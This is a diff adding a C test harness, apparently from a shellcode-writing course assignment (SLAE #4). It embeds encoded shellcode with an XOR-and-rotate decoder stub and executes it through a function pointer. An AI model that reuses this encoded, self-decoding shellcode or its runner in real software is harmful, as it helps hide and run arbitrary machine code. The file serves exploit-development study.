@@ -1,0 +1,22 @@
+// SLAE Assignment #4: Run our ROT7-XOR Encoded Shellcode
+// Website:  http://blog.jsiob.com
+// SLAE-ID: 1400
+
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x15\x5e\x31\xc9\xb1\x19\x31\xc0\x8a\x06\x34\xaa\xc0\xc8\x07\x88\x06\x46\xe2\xf2\xeb\x05\xe8\xe6\xff\xff\xff\x32\xca\x82\x9e\x3d\x3d\x13\x9e\x9e\x3d\x9b\x1e\x9d\x6e\x5b\x82\x6e\xdb\x03\x6e\x5a\xf2\x2f\x4c\xea";
+
+
+main()
+{
+
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
